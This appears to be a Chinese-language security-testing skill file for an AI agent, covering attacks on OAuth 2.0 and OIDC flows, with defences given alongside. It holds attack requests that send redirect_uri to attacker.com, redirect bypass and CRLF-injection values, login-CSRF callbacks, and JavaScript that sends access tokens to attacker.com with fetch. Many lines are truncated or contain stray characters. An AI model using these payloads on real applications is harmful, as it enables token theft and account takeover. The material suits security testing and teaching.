---
name: api-oauth-001
description: "OAuth 2 适用于: 目标应用使用 OAuth 2.0 和OpenID Connect (OIDC) 进行第三方登录或 API 授权; 存在 \"Login with Google/GitHub/Facebook\" 等社交登录按钮; API 使用 OAuth access_token 和OIDC id_token 进行认证"
license: MIT
metadata:
  author: HOS-Sec-Engine
  version: 2026-06
  tags:
  - oauth
  - oauth2
  - oidc
  - authorization-code
  - csrf
  - token-theft
  - redirect-uri
  - pkce
  - state-parameter
  - implicit-grant
  category: api
  risk-level: critical
  confidence: 0.91
---
# OAuth Flow Attack Techniques
OAuth 2.0 和OpenID Connect (OIDC) 是现代应用最广泛使用的授权和认证协议。OAuth 流程攻击利用协议实现中的配置错误、参数校验不严和流程设计缺陷，通过拦截授权码、操纵重定向 URI、绕过 CSRF 保护、窃取 token 等方式获取未授权访问。OAuth 的安全性依赖于多个安全机制的正确实现：state 参数防 CSRFCSRF、redirect_uri 严格匹配、PKCE 防授权码拦截、token 安全传输和存储。任何一个环节的疏漏都可能导致认证绕过或 token 泄露
## 何时使用

### 触发场景

- 目标应用使用 OAuth 2.0 和OpenID Connect (OIDC) 进行第三方登录或 API 授权
- 存在 "Login with Google/GitHub/Facebook" 等社交登录按钮
- API 使用 OAuth access_token 和OIDC id_token 进行认证
- OAuth 授权码流程（Authorization Code Flow）用于 Web 或移动应
- 隐式授权流程（Implicit Grant）用于单页应用(SPA)
- 设备授权流程（Device Authorization）用于 IoT 或无浏览器设备
- 客户端凭证流程（Client Credentials）用于服务间通信

### 关键词

`oauth`, `oauth2`, `openid`, `oidc`, `authorization code`, `access token`, `id token`, `refresh token`, `redirect_uri`, `state parameter`, `pkce`, `code_verifier`, `code_challenge`, `implicit grant`, `client credentials`, `token endpoint`, `authorization endpoint`, `scope`, `consent`, `social login`, `第三方登录`, `oauth 攻击`, `token 泄露`, `授权码拦截`, `redirect uri 操纵`

### 识别指标

- /oauth/authorize
- /oauth/token
- /oauth/callback
- /auth/callback
- code=
- state=
- redirect_uri=
- client_id=
- scope=
- response_type=code
- response_type=token
- access_token=
- id_token=
- grant_type=

### 别名

`oauth 绕过`, `oauth csrf`, `authorization code interception`, `redirect uri manipulation`, `state parameter bypass`, `token leakage`, `pkce bypass`, `implicit grant attack`, `oauth 劫持`, `social login bypass`

## 操作检查清单

1. 识别 OAuth 流程类型（Authorization Code、Implicit、Client Credentials、Resource Owner Password
2. 检查 redirect_uri 参数是否接受任意 URL 或仅白名单 URL
3. 验证 state 参数是否存在、是否随机、是否在回调时验证
4. 检查 PKCE 是否实施（code_challenge ?code_verifier
5. 测试授权码是否可被截获并兑换为access_token
6. 检查 token 传输方式（HTTPS、是否在 URL fragment 中暴露）
7. 测试 Referer 头是否会泄露的 token
8. 检查 id_token 签名验证和aud 声明验证
9. 测试 scope 验证是否严格
10. 检查 OAuth 客户端密钥是否暴露在客户端代码中
11. 测试动态客户端注册是否存在未审批注册漏
12. 检查 token 刷新流程是否安全（refresh token 轮换机制

## 技术手段

- 授权码拦截：截获 authorization code 并在攻击者客户端兑换 token
- redirect_uri 操纵：将回调地址指向攻击者控制的服务
- state 参数 CSRF：缺少 state 时构造恶意 OAuth 链接强制用户登录攻击者账户
- Referer 头泄露token 泄露：诱导用户从有 token 的页面跳转到攻击者站
- Implicit Grant token 盗窃：从 URL fragment 中获取 access_token
- PKCE 绕过：不发送 code_verifier 或使用弱 code_challenge_method
- Scope 提升：请求超出预期的 scope 获取更高权限
- Token 重放：使用过期或已撤销的 token 访问 API
- OIDC id_token 伪造：跳过签名验证接受伪造的身份声明
- OAuth 开放重定向：利用redirect_uri 参数将用户重定向到恶意网站

## 实战经验

### 症状

- OAuth 回调 URL 中的 authorization code 可被第三方截获并兑换 access_token
- 修改 redirect_uri 参数为攻击者控制的 URL，授权码被发送到攻击者服务器
- 缺少 state 参数导致 CSRF 攻击，攻击者可强制用户使用攻击者账户登
- OAuth token 通过 Referer 头泄露给第三方网站
- Implicit Grant ?access_token 和URL fragment 中暴露（#access_token=xxx
- PKCE 未正确实现或 code_verifier 未验证，授权码可被拦截使用
- Scope 未正确验证，获得的 token 拥有超出预期的权限

### 根因分析

- redirect_uri 参数未严格白名单校验，允许攻击者控制回调地址
- state 参数未生成、未验证或可预测，无法防止 CSRF 攻击
- 授权限(authorization code) 未绑定客户端或会话，可被跨客户端使用
- PKCE (Proof Key for Code Exchange) 未实施或 code_verifier 未验证
- Implicit Grant ?token 暴露在URL 中，可被浏览器历史、Referer、日志捕
- token 通过不安全的传输方式（HTTP 而非 HTTPS）传
- OAuth 客户端密钥(client_secret) 硬编码在客户端代码中
- Scope 验证缺失，token 可访问超出授权范围的数据
- OIDC id_token 未验证签名和 和 aud (audience) 声明

### 实战观察

- redirect_uri 开放重定向是最常见的OAuth 漏洞，占比超过 40%
- state 参数缺失在移动应用OAuth 实现中尤为常
- PKCE 已成为 OAuth 2.1 的强制要求，但很多系统仍未实施
- Implicit Grant 已被 OAuth 2.1 弃用，但仍有大量 SPA 使用
- OAuth token 通过 Referer 头泄露是真实世界中被广泛利用的攻击向量
- Google、GitHub、Facebook 等主流 OAuth 提供商的实现通常安全，但第三方集成可能不安全
- OIDC session management 漏洞可导致跨应用会话劫持
- 动态客户端注册 (DCR) 如果未做审批，可被用于注册恶意 OAuth 客户端

### 常见错误

- redirect_uri 使用子域名匹配(*.example.com) 而非精确匹配置
- state 参数使用固定值或可预测的值（如时间戳
- 在客户端代码（JavaScript、移动应用）中存储 client_secret
- 使用 Implicit Grant 而非 Authorization Code + PKCE
- 不验证 id_token ?signature ?aud 声明
- 允许 redirect_uri 使用自定义 scheme（myapp://callback）未做验证
- 授权码有效期过长（标准建议不超过 10 分钟
- access_token 有效期过长或缺少 refresh token 轮换机制
- Scope 未在 token 兑换时验证，用户可请求任意 scope

### 补充说明

- OAuth 2.0 规范 RFC 6749 ?RFC 6819 定义了安全最佳实践
- OAuth 2.1 整合了所有安全建议，PKCE 成为强制要求
- OIDC Core 规范 (OpenID Connect Core 1.0) ?OAuth 2.0 之上添加了身份认证层
- 测试 OAuth 安全需要控制一个 OAuth 客户端并监控授权流程
- Burp Suite ?OAuth 2.0 插件可自动化测试常见 OAuth 漏洞

## 示例

### Authorization Code 拦截攻击

截获 OAuth 授权码并在攻击者控制的客户端兑换 access_token

```
步骤 1: 诱导用户访问恶意 OAuth 授权链接
https://oauth-provider.com/authorize?
  response_type=code
  &client_id=ATTACKER_CLIENT_ID
  &redirect_uri=https://attacker.com/callback
  &scope=read_profile+read_email
  &state=random123

步骤 2: 用户登录后，OAuth 提供商将授权码发送到攻击者回调地址
https://attacker.com/callback?code=AUTH_CODE_XXX&state=random123

步骤 3: 攻击者使用截获的授权码兑换 access_token
POST https://oauth-provider.com/oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
&code=AUTH_CODE_XXX
&redirect_uri=https://attacker.com/callback
&client_id=ATTACKER_CLIENT_ID
&client_secret=ATTACKER_CLIENT_SECRET

响应:
{
  "access_token": "ya29.xxx",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "1//0xxx",
  "scope": "read_profile read_email"
}

步骤 4: 使用 access_token 访问用户数据
GET https://api.provider.com/user/profile
Authorization: Bearer ya29.xxx

防御: 实施 PKCE，授权码绑定客户端和 redirect_uri，缩短授权码有效期
```

### redirect_uri 操纵攻击

修改 redirect_uri 参数将授权码和 token 发送到攻击者控制的地址

```
正常 OAuth 授权请求:
https://oauth-provider.com/authorize?
  response_type=code
  &client_id=legitimate_client_id
  &redirect_uri=https://legitimate-app.com/callback
  &scope=read_profile
  &state=abc123

攻击 1 - 任意 redirect_uri:
https://oauth-provider.com/authorize?
  response_type=code
  &client_id=legitimate_client_id
  &redirect_uri=https://attacker.com/steal
  &scope=read_profile
  &state=abc123
如果未严格校验 redirect_uri，授权码将发送到 attacker.com

攻击 2 - 子域名绕过
合法 redirect_uri: https://app.example.com/callback
攻击 redirect_uri: https://attacker.example.com/callback
如果只校验域名后缀 example.com，子域名可绕过

攻击 3 - 路径绕过:
合法 redirect_uri: https://app.example.com/callback
攻击 redirect_uri: https://app.example.com/callback.evil.com
? https://app.example.com@attacker.com/callback
? https://app.example.com%2F%40attacker.com/

攻击 4 - 换行符注入(CRLF):
redirect_uri=https://app.example.com/callback%0d%0aSet-Cookie:%20session=attacker

攻击 5 - 开放重定向
redirect_uri=https://app.example.com/redirect?url=https://attacker.com
利用目标应用的开放重定向漏洞间接控制回调地址

防御: redirect_uri 必须精确匹配预注册的 URI，不接受通配符或模式匹配
```

### State 参数缺失导致 CSRF 攻击

OAuth 流程中缺少 state 参数验证，攻击者可强制用户使用攻击者账户登

```
场景: 目标应用使用 OAuth 社交登录，未使用 state 参数

步骤 1: 攻击者使用自己的账户发起 OAuth 授权，获取授权码
https://oauth-provider.com/authorize?
  response_type=code
  &client_id=TARGET_CLIENT_ID
  &redirect_uri=https://target-app.com/oauth/callback
  &scope=read_profile
  (?state 参数)

步骤 2: 用户登录成功后，回调 URL 为
https://target-app.com/oauth/callback?code=ATTACKER_CODE

步骤 3: 攻击者诱导受害者点击恶意链接
https://target-app.com/oauth/callback?code=ATTACKER_CODE

步骤 4: 目标应用处理回调:
- ?ATTACKER_CODE 兑换 access_token
- ?token 获取用户信息（攻击者的账户信息）
- 将受害者会话绑定到攻击者账户
- 受害者现在以攻击者身份登录

攻击效果:
- 受害者看到的个人资料是攻击者的
- 如果应用有账户关联功能，受害者账户可能被关联到攻击者身份
- 攻击者可以受害者的身份执行操作（取决于应用逻辑）

防御: 必须生成随机 state 参数，存储在服务：session 中，回调时严格验证
state 应该是 cryptographically random，不可预测，单次使用
```

### OAuth Token 通过 Referer 头泄

?OAuth token 的页面引用第三方资源，token 通过 Referer 头泄

```
场景: SPA 使用 Implicit Grant，access_token 和URL fragment 中

步骤 1: 用户完成 OAuth 授权，被重定向到:
https://spa-app.com/dashboard#access_token=ya29.xxx&token_type=Bearer&expires_in=3600

步骤 2: 页面加载第三方资源（图片、脚本、iframe）
<img src="https://attacker.com/track.png">
<iframe src="https://attacker.com/page.html">
<script src="https://cdn.attacker.com/lib.js">

步骤 3: 浏览器发送请求时携带 Referer 头泄露
GET https://attacker.com/track.png
Referer: https://spa-app.com/dashboard#access_token=ya29.xxx&token_type=Bearer...

步骤 4: 攻击者服务器记录 Referer 头，获取 access_token

变体: Meta 标签泄露
<meta name="referrer" content="unsafe-url">  // 强制发送完整 URL

变体: window.location 泄露
<script>
  fetch('https://attacker.com/collect?token=' + window.location.hash);
</script>

防御:
- 使用 Authorization Code + PKCE 替代 Implicit Grant
- token 存储在 httpOnly cookie 或内存中，不在 URL 中
- 设置 <meta name="referrer" content="strict-origin-when-cross-origin">
- 避免在含 token 的页面加载第三方资源
```

### Implicit Grant Token 盗窃

利用 Implicit Grant 流程中 token 从 URL fragment 暴露的弱点窃取 token

```
Implicit Grant 流程:
1. 用户被重定向到 OAuth 提供商授权页面
2. 用户授权后被重定向回客户端
   https://spa-app.com/callback#access_token=ya29.xxx&token_type=Bearer&expires_in=3600

攻击向量 1 - 浏览器历史
- URL fragment 不发送到服务器，但保存在浏览器历史记录中
- 其他用户或恶意扩展可访问历史记录
- history API 可通过 navigation events 捕获 fragment

攻击向量 2 - 日志记录:
- 代理服务器、CDN、WAF 可能记录完整 URL
- 浏览器开发者工具网络面板显示完整 URL
- 移动应用日志可能打印 redirect URL

攻击向量 3 - XSS 结合:
如果 SPA 存在 XSS 漏洞:
<script>
  const token = window.location.hash.split('access_token=')[1].split('&')[0];
  fetch('https://attacker.com/steal?token=' + token);
</script>

攻击向量 4 - 恶意浏览器扩展
- 扩展可访问所有页面的 URL 包括 fragment
- 可拦截和修改 OAuth 回调

OAuth 2.1 已弃用 Implicit Grant，推荐使用 Authorization Code + PKCE
```

### PKCE 绕过攻击

PKCE (Proof Key for Code Exchange) 未正确实施或绕过，授权码可被拦截使用

```
正常 PKCE 流程:
1. 客户端生成 code_verifier (随机 43-128 字符)
2. 计算 code_challenge = BASE64URL(SHA256(code_verifier))
3. 授权请求携带 code_challenge ?code_challenge_method=S256
4. Token 兑换时携带 code_verifier
5. 服务端验证 code_verifier 与之前存储的 code_challenge 匹配

攻击 1 - 服务端未验证 code_verifier:
POST /oauth/token
grant_type=authorization_code
&code=INTERCEPTED_CODE
&redirect_uri=https://app.com/callback
&client_id=CLIENT_ID
 (?code_verifier)
如果服务端不要求 code_verifier，截获的授权码可直接使用

攻击 2 - 使用弱的 code_challenge_method (plain):
code_challenge=S3cur3V3r1f13r&code_challenge_method=plain
?plain 模式的 code_challenge = code_verifier，截获授权请求即可获取
应强制使用 S256 (SHA256) 方法

攻击 3 - code_verifier 可预测
如果 code_verifier 使用弱随机数生成（如时间戳、Math.random）
攻击者可枚举或预测 code_verifier

攻击 4 - code_challenge 未绑定授权码:
如果服务端不绑定 code_challenge 与授权码关联
攻击者可截获授权码并用任意 code_verifier 兑换

防御:
- 强制使用 code_challenge_method=S256
- 验证 code_verifier 与授权码绑定
- code_verifier 使用 cryptographically secure random 生成
```

### Scope 提升攻击

请求超出预期的 OAuth scope 获取更高权限制access_token

```
正常授权请求:
https://oauth-provider.com/authorize?
  response_type=code
  &client_id=CLIENT_ID
  &redirect_uri=https://app.com/callback
  &scope=read_profile
  &state=abc123

攻击 1 - 请求额外 scope:
https://oauth-provider.com/authorize?
  response_type=code
  &client_id=CLIENT_ID
  &redirect_uri=https://app.com/callback
  &scope=read_profile+write_profile+delete_account+admin
  &state=abc123
如果用户授权且服务端未验证 scope，token 将获得额外权限

攻击 2 - Scope 注入:
scope=read_profile%20admin:write%20superuser
利用 scope 解析逻辑注入额外权限

攻击 3 - 动态 Scope 注册:
部分 OAuth 提供商允许动态注册 scope
攻击者注册自定义 scope 并请求

验证方法:
1. 检查 token 响应中的 scope 字段
2. 使用 token 访问高权限API 端点
3. 检查服务端是否验证token ?scope 声明

防御:
- 服务端验证 token scope 是否匹配客户端注册范围
- 用户授权页面明确显示请求的 scope
- 敏感 scope 需要额外审批或 MFA
```

## 验证标准

### 验证指标

- 截获的 authorization code 可成功兑换 access_token
- 修改 redirect_uri 后授权码被发送到攻击者控制的地址
- 缺少 state 参数防 CSRFOAuth 回调被正常处理
- Referer 头中包含 access_token 和id_token
- Implicit Grant ?token 可从 URL fragment 中提
- PKCE code_verifier 缺失或错误时 token 兑换仍然成功
- 请求额外 scope ?token 包含未授权的权限

### 成功标志

- 成功获取其他用户有access_token 和id_token
- 使用截获的 token 访问受保护的 API 返回 200
- OAuth 回调处理了未预期的 redirect_uri
- CSRF 攻击成功，受害者账户被绑定到攻击者身份
- Scope 提升的 token 可访问高权限资源

### 误报标志

- redirect_uri 被拒绝(400 Bad Request)，说明校验正确
- 缺少 state 时回调被拒绝 (400/403)
- PKCE code_verifier 不匹配返回invalid_grant
- Token 兑换返回 invalid_client ?invalid_grant
- Scope 被限制在客户端注册范围内，额外 scope 被忽
- Implicit Grant 被禁用，强制使用 Authorization Code

## 防御建议

### 推荐做法

- 始终使用 Authorization Code Flow + PKCE，弃用 Implicit Grant
- redirect_uri 严格白名单校验，精确匹配不接受通配置
- 生成随机 state 参数并在回调时验证，防止 CSRF 攻击
- 实施 PKCE，强制 code_challenge_method=S256，验证 code_verifier
- 授权码有效期不超过 10 分钟，单次使用后立即失效
- access_token 有效期尽量短（-60 分钟），使用 refresh token 轮换
- token 通过 HTTPS 传输，存储在 httpOnly secure cookie 或内存中
- 不在 URL 中传输token（避免 Referer 泄露、历史记录暴露）
- 验证 id_token ?signature、iss、aud、exp 声明
- Scope 在服务端验证，token scope 不超过客户端注册范围
- 客户端密钥(client_secret) 只存储在服务器端，不嵌入客户端代码中
- 实施 token 绑定（DPoP ?mTLS）防止token 重放
- 监控异常 OAuth 流量模式（异常 redirect_uri、高频 token 兑换等）

### 缓解措施

- 定期审计 OAuth 客户端注册，删除不再使用的客户端点
- 实施 OAuth 安全策略检查工具（如OAuth Scanner、OAuth2lib），
- 使用 OAuth 提供商的安全最佳实践指南配置
- 对用户进行 OAuth 授权页面安全意识培训
- 实施 OAuth token 吊销机制，支持即时撤销泄露的 token

## 参考链接

- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_OAuth
- https://portswigger.net/web-security/oauth
- https://tools.ietf.org/html/rfc6749
- https://tools.ietf.org/html/rfc7636
- https://tools.ietf.org/html/rfc8252
- https://openid.net/specs/openid-connect-core-1_0.html
- https://oauth.net/2/
- https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html
